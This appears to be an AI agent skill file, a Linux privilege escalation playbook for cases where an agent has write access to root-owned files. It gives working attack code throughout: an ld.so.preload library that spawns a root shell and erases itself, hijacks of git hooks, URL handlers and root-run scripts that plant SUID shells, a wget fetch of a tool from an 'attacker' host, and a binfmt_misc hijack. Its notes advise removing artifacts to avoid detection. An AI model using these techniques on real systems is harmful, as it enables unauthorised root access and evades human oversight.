---
name: privilege-escalation-write-to-root
description: Privilege escalation techniques when you can write to root-owned files. Use this skill whenever you have write access to system files owned by root and need to escalate privileges. This includes scenarios where you can modify /etc/ld.so.preload, git hooks, schema handlers, or any root-executed scripts in user-writable directories. Make sure to use this skill when you discover writable paths that root processes might execute or modify.
---

# Privilege Escalation: Arbitrary File Write to Root

When you have write access to files owned by root, you can exploit several vectors to escalate privileges. This skill covers the most reliable techniques.

## When to Use This Skill

Use this skill when:
- You discover you can write to `/etc/ld.so.preload` or similar system files
- You have write access to a `.git` folder in a privileged context
- You can modify schema handlers or desktop entries
- You find root-executed scripts in user-writable directories
- You need to escalate from a low-privilege shell to root

## Technique 1: /etc/ld.so.preload

The `/etc/ld.so.preload` file works like the `LD_PRELOAD` environment variable but also affects SUID binaries. If you can write to it, you can load a malicious library with every executed binary.

### How it works

1. Create a shared object that drops a root shell
2. Add its path to `/etc/ld.so.preload`
3. Trigger any binary execution (or wait for a privileged process)

### Implementation

```c
// pe.c - Privilege escalation shared object
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");  // Remove the preload file to avoid detection
    setgid(0);                      // Set group ID to root
    setuid(0);                      // Set user ID to root
    system("/bin/bash");           // Spawn a root shell
}
```

Compile and deploy:
```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
echo "/tmp/pe.so" > /etc/ld.so.preload
```

**Note:** The `_init()` function runs before `main()` in any binary that loads, giving you root immediately.

## Technique 2: Git Hooks

Git hooks are scripts that run automatically on git events (commit, merge, push, etc.). If a privileged user or script performs git operations in a repository you can write to, you can hijack the hooks.

### Detection

Look for `.git/hooks` directories you can write to:
```bash
find / -name ".git" -type d -writable 2>/dev/null
```

### Exploitation

Create a hook that creates a SUID shell:

```bash
# Create the pre-commit hook
cat > .git/hooks/pre-commit <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 4777 /tmp/rootshell
EOF

chmod +x .git/hooks/pre-commit
```

Then trigger a commit (or wait for the privileged user to commit):
```bash
git add .
git commit -m "trigger"
```

## Technique 3: Schema Handlers

You can hijack URL handlers by modifying desktop entry files. When a user clicks any HTTP/HTTPS link, your malicious code executes.

### Implementation

1. Create a malicious desktop entry:

```bash
cat > ~/.local/share/applications/evil.desktop <<'EOF'
[Desktop Entry]
Exec=sh -c 'cp /bin/bash /tmp/rootshell && chmod 4777 /tmp/rootshell'
Type=Application
Name=Evil Desktop Entry
EOF
```

2. Register it as the HTTP/HTTPS handler:

```bash
cat >> ~/.config/mimeapps.list <<'EOF'
[Default Applications]
x-scheme-handler/http=evil.desktop
x-scheme-handler/https=evil.desktop
EOF
```

3. Trigger by clicking any link in a browser or application.

## Technique 4: Root-Executed User-Writable Scripts

If root executes scripts or binaries from directories you can write to, you can hijack them.

### Detection

Use `pspy` to monitor what root is executing:

```bash
# Download and run pspy
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64
```

Look for root processes executing paths you can write to.

### Exploitation

1. **Confirm writeability:**
   ```bash
   ls -la /path/to/script
   # Both file and directory must be writable by you
   ```

2. **Backup and hijack:**
   ```bash
   mv /path/to/script /path/to/script.bk
   
   cat > /path/to/script <<'EOF'
   #!/bin/bash
   cp /bin/bash /tmp/rootshell
   chown root:root /tmp/rootshell
   chmod 4777 /tmp/rootshell
   EOF
   
   chmod +x /path/to/script
   ```

3. **Trigger the execution** (e.g., click a UI button, run a service)

4. **Grab the shell:**
   ```bash
   /tmp/rootshell -p
   ```

## Technique 5: binfmt_misc

The `/proc/sys/fs/binfmt_misc` directory controls which interpreters handle specific file types. This can be abused to execute code when certain file types are opened.

### Requirements

- Write access to `/proc/sys/fs/binfmt_misc/register`
- A file type that will be opened by a privileged process

### Implementation

```bash
# Register a custom interpreter for a file type
echo ':mytype:M::\x7fELF::/path/to/malicious/interpreter' > /proc/sys/fs/binfmt_misc/register
```

**Note:** This technique requires careful analysis of the target system's file type handling.

## Quick Reference

| Technique | Write Access Needed | Trigger |
|-----------|-------------------|---------|
| ld.so.preload | `/etc/ld.so.preload` | Any binary execution |
| Git hooks | `.git/hooks/` | Git commit/merge |
| Schema handlers | `~/.config/mimeapps.list` | Clicking URLs |
| User-writable scripts | Script path + directory | Privileged execution |
| binfmt_misc | `/proc/sys/fs/binfmt_misc/register` | Opening specific file types |

## Safety Notes

- Always backup original files before modifying
- Remove your artifacts after successful escalation to avoid detection
- Some techniques require the target process to be restarted
- Test in a controlled environment before production use
